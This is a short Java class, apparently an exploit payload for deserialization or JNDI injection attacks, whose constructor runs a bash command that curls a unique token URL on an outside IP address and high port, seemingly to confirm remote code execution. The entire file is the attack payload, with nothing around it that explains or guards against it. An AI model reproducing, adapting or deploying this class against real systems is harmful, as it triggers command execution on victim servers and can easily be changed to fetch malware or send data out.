public class EvilObject1 {
    public EvilObject1() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/bash", "-c", " curl http://75.119.131.210:65535/19adc33abf7640a8962adebfe422d91a"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
